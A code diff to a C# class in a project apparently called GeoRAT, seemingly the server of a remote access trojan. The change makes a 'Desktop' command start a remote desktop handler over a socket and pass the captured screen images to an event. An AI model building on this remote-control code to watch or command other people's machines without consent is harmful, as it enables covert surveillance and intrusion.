@@ -1,8 +1,8 @@
 ﻿
 using System.Net.Sockets;
 using GeoRAT.Core.Commands;
+using GeoRAT.Server.Core;
 using GeoRAT.Server.Net;
-using GeoRAT.Server.Net.DesktopSharing;
 
 
 namespace GeoRAT.Server.CommandHandlers
@@ -10,35 +10,30 @@ namespace GeoRAT.Server.CommandHandlers
     //This class sends commands to client using DataHandler. 
     class CommandSender
     {
+        public delegate void DataReceived(byte[] buffer);
+        public event DataReceived OnDataReceived;
+        public CommandSender()
+        {
+            
+        }
 
-        //Delegates for remote desktop which i haven't implemented yet 
-
-    
         public CommandSender(Socket s, Commands param1)
         {
-
-            DataHandler sender = new DataHandler(s);
+            var sender = new DataHandler(s);
             switch (param1.CommandType)
             {
-              
+
                 case "Desktop": //If we want to start remote desktop session
                     sender.Send(param1);
-                    break; 
-                default: //Just send command for now 
+                    var desktopHandler = new RemoteDesktopHandler(s);
+                    desktopHandler.Start();
+                    var data = desktopHandler.ReceiveImage();
+                    OnDataReceived?.Invoke(data);
+                    break;
+                   default: //Just send command for now 
                     sender.Send(param1);
                     break;
             }
-
-        }
-
-       
-        public CommandSender()
-        {
-
-        }
-
-
-        
-     
         }
     }
+}
